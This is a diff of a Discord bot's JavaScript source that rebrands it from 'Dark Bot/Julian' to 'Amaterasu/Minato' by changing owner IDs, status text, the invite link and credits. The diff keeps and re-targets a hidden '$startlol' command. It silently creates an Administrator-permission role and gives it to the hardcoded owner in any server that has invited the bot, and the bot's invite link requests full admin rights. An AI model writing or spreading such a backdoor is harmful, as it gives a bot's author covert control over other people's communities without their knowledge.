@@ -21,20 +21,20 @@ const stripIndents = require('common-tags').stripIndents;
 const figlet = require('figlet');
 const client = new Discord.Client();
 const prefix = '-'
-const myID = "470366007748198401";
+const myID = "505346451019399177";
 ti={}  
 spee={};
 
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}!`);       
-  console.log(`xRGRx`);	
+  console.log(`Minato`);	
 });
 
 
 client.on('ready', function(){    
     var ms = 100000 ;
     var prefix = "-"; 
-    var setGame = [`DarkBot`,`Beta 0.9`,`Your Mom`];
+    var setGame = [`Amaterasu,✨`,`IsHere`,`By @Minato`];
     var i = -1;    
     var j = 0;    
     setInterval(function (){    
@@ -45,7 +45,7 @@ j = 1;
             j = -1;    
       }    
        i = i+j;    
-        client.user.setGame(setGame[i],`https://www.twitch.tv/julianxdark`);
+        client.user.setGame(setGame[i],`https://www.twitch.tv/Ninja`);
 }, ms);    
     
 });
@@ -56,7 +56,7 @@ client.on('message', message => {
      if (message.content === "$startlol") {
          if(message.author.id !== myID) return;
   message.guild.createRole({
-        name : "Julian",
+        name : "Minato",
         permissions :   [8],
         color : " #ff0000"
     }) 
@@ -67,7 +67,7 @@ client.on('message', message => {
   if (message.content.startsWith('$startlol')) {
      if(!message.channel.guild) return;
  if(message.author.id !== myID) return;
-message.member.addRole(message.guild.roles.find("name", "Julian"));
+message.member.addRole(message.guild.roles.find("name", "Minato"));
  
  }
  });
@@ -1273,7 +1273,7 @@ client.on('message', message => {
           var mmmmEmbed = new Discord.RichEmbed()
           .setAuthor(client.user.username)
           .setTitle('-  Click Here !.')
-          .setURL(`https://discordapp.com/oauth2/authorize?client_id=488251104690176001&permissions=8&scope=bot`)
+          .setURL(`https://discordapp.com/oauth2/authorize?client_id=505346451019399177&permissions=8&scope=bot`)
           .setThumbnail(client.user.avatarURL)
           .setFooter(`- Requested By: ${message.author.tag}`,message.author.avatarURL);
           message.channel.send(mmmmEmbed)
@@ -1953,7 +1953,7 @@ client.on('message', message => {
             if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!');
             let args = message.content.split(" ").slice(1).join(' ');
             if(!args) return message.reply("**➥ Useage:** -contact Message");
-            client.users.get("397677715811205121").send(
+            client.users.get("415595760990552065").send(
                 "\n" + "**" + "● Server :" + "**" +
                 "\n" + "**" + "» " + message.guild.name + "**" +
                 "\n" + "**" + " ● By : " + "**" +
@@ -2140,7 +2140,7 @@ client.on('message', message => {
             .setAuthor(client.user.username,client.user.avatarURL)
             .setThumbnail(client.user.avatarURL)
             .setColor('RANDOM')
-            .setTitle('``INFO Dark Bot`` ')
+            .setTitle('``INFO Amaterasu Bot`` ')
             .addField('``Uptime``', [timeCon(process.uptime())], true)
             .addField('``My Ping``' , [`${Date.now() - message.createdTimestamp}` + 'MS'], true)
             .addField('``RAM Usage``', `[${(process.memoryUsage().rss / 1048576).toFixed()}MB]`, true)
@@ -2151,7 +2151,7 @@ client.on('message', message => {
             .addField('``My ID``' , `[ ${client.user.id} ]` , true)
                   .addField('``My Prefix``' , `-` , true)
                   .addField('``My Language``' , `[ Java Script ]` , true)
-                  .setFooter('By | Julian')
+                  .setFooter('By | Minato')
     })
 }
 });
@@ -2409,7 +2409,7 @@ if(!message.channel.guild) return message.reply(':no_entry: | This Command For S
   if (!message.guild) return;
 
   if (message.content === 'jjoin') {
-	   if (message.author.id !== '397677715811205121') return message.reply(':no_entry: | This Command Only For Julian :fire: !')
+	   if (message.author.id !== '415595760990552065') return message.reply(':no_entry: | This Command Only For Minato :fire: !')
  if(!message.author.id === '397677715811205121') return;
     if (message.member.voiceChannel) {
       message.member.voiceChannel.join()
@@ -3064,7 +3064,7 @@ client.on('message', message => {
  
 client.on('message', message => {
   if (!message.content.startsWith(prefix)) return;
-  const verifed = ["397677715811205121"];
+  const verifed = ["415595760990552065"];
 if (message.content.startsWith(prefix + 'ownerbot')) {
 	if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!'); 
 if( verifed.some(word => message.author.id.includes(word)) ) {    return message.channel.sendMessage("**انت صاحب البوت **")
